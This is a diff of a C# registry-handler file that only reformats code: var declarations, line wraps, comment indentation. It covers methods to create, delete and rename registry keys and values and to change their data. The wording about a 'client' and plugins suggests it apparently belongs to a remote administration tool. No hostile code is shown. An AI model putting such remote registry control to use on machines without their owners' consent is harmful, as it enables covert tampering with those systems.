@@ -1,5 +1,5 @@
-﻿using Microsoft.Win32;
-using System;
+﻿using System;
+using Microsoft.Win32;
 using static Plugin.Handler.RegistrySeeker;
 
 namespace Plugin.Handler
@@ -21,7 +21,7 @@ namespace Plugin.Handler
         private const string REGISTRY_VALUE_CHANGE_ERROR = "Cannot change value: Error writing to the registry";
 
         /// <summary>
-        /// Attempts to create the desired sub key to the specified parent.
+        ///     Attempts to create the desired sub key to the specified parent.
         /// </summary>
         /// <param name="parentPath">The path to the parent for which to create the sub-key on.</param>
         /// <param name="name">output parameter that holds the name of the sub-key that was create.</param>
@@ -32,28 +32,30 @@ namespace Plugin.Handler
             name = "";
             try
             {
-                RegistryKey parent = GetWritableRegistryKey(parentPath);
+                var parent = GetWritableRegistryKey(parentPath);
 
 
                 //Invalid can not open parent
                 if (parent == null)
                 {
-                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + parentPath +
+                               ", try running client as administrator";
                     return false;
                 }
 
                 //Try to find available names
-                int i = 1;
-                string testName = String.Format("New Key #{0}", i);
+                var i = 1;
+                var testName = string.Format("New Key #{0}", i);
 
                 while (parent.ContainsSubKey(testName))
                 {
                     i++;
-                    testName = String.Format("New Key #{0}", i);
+                    testName = string.Format("New Key #{0}", i);
                 }
+
                 name = testName;
 
-                using (RegistryKey child = parent.CreateSubKeySafe(name))
+                using (var child = parent.CreateSubKeySafe(name))
                 {
                     //Child could not be created
                     if (child == null)
@@ -72,11 +74,10 @@ namespace Plugin.Handler
                 errorMsg = ex.Message;
                 return false;
             }
-
         }
 
         /// <summary>
-        /// Attempts to delete the desired sub-key from the specified parent.
+        ///     Attempts to delete the desired sub-key from the specified parent.
         /// </summary>
         /// <param name="name">The name of the sub-key to delete.</param>
         /// <param name="parentPath">The path to the parent for which to delete the sub-key on.</param>
@@ -86,12 +87,13 @@ namespace Plugin.Handler
         {
             try
             {
-                RegistryKey parent = GetWritableRegistryKey(parentPath);
+                var parent = GetWritableRegistryKey(parentPath);
 
                 //Invalid can not open parent
                 if (parent == null)
                 {
-                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + parentPath +
+                               ", try running client as administrator";
                     return false;
                 }
 
@@ -103,7 +105,7 @@ namespace Plugin.Handler
                     return true;
                 }
 
-                bool success = parent.DeleteSubKeyTreeSafe(name);
+                var success = parent.DeleteSubKeyTreeSafe(name);
 
                 //Child could not be deleted
                 if (!success)
@@ -124,7 +126,7 @@ namespace Plugin.Handler
         }
 
         /// <summary>
-        /// Attempts to rename the desired key.
+        ///     Attempts to rename the desired key.
         /// </summary>
         /// <param name="oldName">The name of the key to rename.</param>
         /// <param name="newName">The name to use for renaming.</param>
@@ -135,13 +137,13 @@ namespace Plugin.Handler
         {
             try
             {
-
-                RegistryKey parent = GetWritableRegistryKey(parentPath);
+                var parent = GetWritableRegistryKey(parentPath);
 
                 //Invalid can not open parent
                 if (parent == null)
                 {
-                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + parentPath +
+                               ", try running client as administrator";
                     return false;
                 }
 
@@ -152,7 +154,7 @@ namespace Plugin.Handler
                     return false;
                 }
 
-                bool success = parent.RenameSubKeySafe(oldName, newName);
+                var success = parent.RenameSubKeySafe(oldName, newName);
 
                 //Child could not be renamed
                 if (!success)
@@ -164,7 +166,6 @@ namespace Plugin.Handler
                 //Child was successfully renamed
                 errorMsg = "";
                 return true;
-
             }
             catch (Exception ex)
             {
@@ -174,39 +175,42 @@ namespace Plugin.Handler
         }
 
         /// <summary>
-        /// Attempts to create the desired value for the specified parent.
+        ///     Attempts to create the desired value for the specified parent.
         /// </summary>
         /// <param name="keyPath">The path to the key for which to create the registry value on.</param>
         /// <param name="kind">The type of the registry value to create.</param>
         /// <param name="name">output parameter that holds the name of the registry value that was create.</param>
         /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if the operation succeeded.</returns>
-        public static bool CreateRegistryValue(string keyPath, RegistryValueKind kind, out string name, out string errorMsg)
+        public static bool CreateRegistryValue(string keyPath, RegistryValueKind kind, out string name,
+            out string errorMsg)
         {
             name = "";
             try
             {
-                RegistryKey key = GetWritableRegistryKey(keyPath);
+                var key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + keyPath +
+                               ", try running client as administrator";
                     return false;
                 }
 
                 //Try to find available names
-                int i = 1;
-                string testName = String.Format("New Value #{0}", i);
+                var i = 1;
+                var testName = string.Format("New Value #{0}", i);
 
                 while (key.ContainsValue(testName))
                 {
                     i++;
-                    testName = String.Format("New Value #{0}", i);
+                    testName = string.Format("New Value #{0}", i);
                 }
+
                 name = testName;
 
-                bool success = key.SetValueSafe(name, kind.GetDefault(), kind);
+                var success = key.SetValueSafe(name, kind.GetDefault(), kind);
 
                 //Value could not be created
                 if (!success)
@@ -224,26 +228,27 @@ namespace Plugin.Handler
                 errorMsg = ex.Message;
                 return false;
             }
-
         }
 
         /// <summary>
-        /// Attempts to delete the desired registry value from the specified key.
+        ///     Attempts to delete the desired registry value from the specified key.
         /// </summary>
         /// <param name="keyPath">The path to the key for which to delete the registry value on.</param>
-        /// /// <param name="name">The name of the registry value to delete.</param>
+        /// ///
+        /// <param name="name">The name of the registry value to delete.</param>
         /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if the operation succeeded.</returns>
         public static bool DeleteRegistryValue(string keyPath, string name, out string errorMsg)
         {
             try
             {
-                RegistryKey key = GetWritableRegistryKey(keyPath);
+                var key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + keyPath +
+                               ", try running client as administrator";
                     return false;
                 }
 
@@ -255,7 +260,7 @@ namespace Plugin.Handler
                     return true;
                 }
 
-                bool success = key.DeleteValueSafe(name);
+                var success = key.DeleteValueSafe(name);
 
                 //Value could not be deleted
                 if (!success)
@@ -276,7 +281,7 @@ namespace Plugin.Handler
         }
 
         /// <summary>
-        /// Attempts to rename the desired registry value.
+        ///     Attempts to rename the desired registry value.
         /// </summary>
         /// <param name="oldName">The name of the registry value to rename.</param>
         /// <param name="newName">The name to use for renaming.</param>
@@ -287,12 +292,13 @@ namespace Plugin.Handler
         {
             try
             {
-                RegistryKey key = GetWritableRegistryKey(keyPath);
+                var key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + keyPath +
+                               ", try running client as administrator";
                     return false;
                 }
 
@@ -303,7 +309,7 @@ namespace Plugin.Handler
                     return false;
                 }
 
-                bool success = key.RenameValueSafe(oldName, newName);
+                var success = key.RenameValueSafe(oldName, newName);
 
                 //Value could not be renamed
                 if (!success)
@@ -315,7 +321,6 @@ namespace Plugin.Handler
                 //Value was successfully renamed
                 errorMsg = "";
                 return true;
-
             }
             catch (Exception ex)
             {
@@ -325,28 +330,33 @@ namespace Plugin.Handler
         }
 
         /// <summary>
-        /// Attempts to change the value for the desired registry value for the 
-        /// specified key.
+        ///     Attempts to change the value for the desired registry value for the
+        ///     specified key.
         /// </summary>
-        /// <param name="value">The registry value to change to in the form of a
-        /// RegValueData object.</param>
-        /// <param name="keyPath">The path to the key for which to change the 
-        /// value of the registry value on.</param>
+        /// <param name="value">
+        ///     The registry value to change to in the form of a
+        ///     RegValueData object.
+        /// </param>
+        /// <param name="keyPath">
+        ///     The path to the key for which to change the
+        ///     value of the registry value on.
+        /// </param>
         /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if the operation succeeded.</returns>
         public static bool ChangeRegistryValue(RegValueData value, string keyPath, out string errorMsg)
         {
             try
             {
-                RegistryKey key = GetWritableRegistryKey(keyPath);
+                var key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + keyPath +
+                               ", try running client as administrator";
                     return false;
                 }
-                
+
                 //Is not default value and does not exist
                 if (!RegistryKeyHelper.IsDefaultValue(value.Name) && !key.ContainsValue(value.Name))
                 {
@@ -354,7 +364,7 @@ namespace Plugin.Handler
                     return false;
                 }
 
-                bool success = key.SetValueSafe(value.Name, value.Data, value.Kind);
+                var success = key.SetValueSafe(value.Name, value.Data, value.Kind);
 
                 //Value could not be created
                 if (!success)
@@ -372,24 +382,21 @@ namespace Plugin.Handler
                 errorMsg = ex.Message;
                 return false;
             }
-
         }
 
         public static RegistryKey GetWritableRegistryKey(string keyPath)
         {
-            RegistryKey key = RegistrySeeker.GetRootKey(keyPath);
+            var key = GetRootKey(keyPath);
 
             if (key != null)
-            {
                 //Check if this is a root key or not
                 if (key.Name != keyPath)
                 {
                     //Must get the subKey name by removing root and '\\'
-                    string subKeyName = keyPath.Substring(key.Name.Length + 1);
+                    var subKeyName = keyPath.Substring(key.Name.Length + 1);
 
                     key = key.OpenWritableSubKeySafe(subKeyName);
                 }
-            }
 
             return key;
         }
